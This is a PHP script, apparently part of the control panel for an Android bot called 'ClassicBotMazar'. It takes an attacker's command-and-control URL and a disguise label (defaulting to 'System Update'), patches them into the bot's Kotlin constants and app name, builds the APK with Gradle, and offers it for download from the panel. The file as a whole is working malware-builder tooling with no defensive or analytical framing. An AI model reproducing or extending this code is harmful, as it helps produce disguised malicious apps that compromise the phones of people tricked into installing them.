<?php
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
$apkName = $input['apkName'] ?? 'ClassicBotMazar';
$appLabel = $input['appLabel'] ?? 'System Update';
$c2Url = $input['c2Url'] ?? '';

if (empty($c2Url)) {
    echo json_encode(['success' => false, 'message' => 'C2 URL is required']);
    exit;
}

// Update Constants.kt with the new C2 URL
$constantsPath = __DIR__ . '/../../../app/src/main/java/org/reddeaddeath/classicbotmazar/Constants.kt';
if (file_exists($constantsPath)) {
    $content = file_get_contents($constantsPath);
    $content = preg_replace('/val urlConnection = ".*"/', 'val urlConnection = "' . $c2Url . '"', $content);
    file_put_contents($constantsPath, $content);
}

// Update strings.xml with the new app label
$stringsPath = __DIR__ . '/../../../app/src/main/res/values/strings.xml';
if (file_exists($stringsPath)) {
    $content = file_get_contents($stringsPath);
    $content = preg_replace('/<string name="app_name">.*<\/string>/', '<string name="app_name">' . $appLabel . '</string>', $content);
    file_put_contents($stringsPath, $content);
}

// Run Gradle build
$output = [];
$returnVar = 0;
// We use ./gradlew assembleDebug to build the APK
$command = 'export JAVA_HOME=/usr/lib/openjdk; cd ' . escapeshellarg(__DIR__ . '/../../../') . ' && ./gradlew assembleDebug 2>&1';
// Try to find the actual JAVA_HOME if the above is wrong
if (!file_exists('/usr/lib/openjdk')) {
    $javaPath = shell_exec('which java');
    if ($javaPath) {
        $realJavaPath = realpath($javaPath);
        // Usually /usr/lib/jvm/java-.../bin/java
        $javaHome = dirname(dirname($realJavaPath));
        $command = "export JAVA_HOME=$javaHome; cd " . escapeshellarg(__DIR__ . '/../../../') . " && ./gradlew assembleDebug 2>&1";
    }
}
exec($command, $output, $returnVar);

if ($returnVar === 0) {
    $apkPath = 'app/build/outputs/apk/debug/app-debug.apk';
    $newApkName = preg_replace('/[^a-zA-Z0-9_\-]/', '', $apkName);
    if (empty($newApkName)) $newApkName = 'app';
    $newApkPath = 'c2/panel/' . $newApkName . '.apk';
    
    $fullApkPath = __DIR__ . '/../../../' . $apkPath;
    if (file_exists($fullApkPath)) {
        if (copy($fullApkPath, __DIR__ . '/../' . $newApkName . '.apk')) {
            echo json_encode([
                'success' => true, 
                'message' => 'Build successful', 
                'downloadUrl' => $newApkName . '.apk',
                'log' => implode("\n", $output)
            ]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Failed to copy APK to panel directory', 'log' => implode("\n", $output)]);
        }
    } else {
        echo json_encode(['success' => false, 'message' => 'APK file not found after build at ' . $apkPath, 'log' => implode("\n", $output)]);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Build failed with exit code ' . $returnVar, 'log' => implode("\n", $output)]);
}
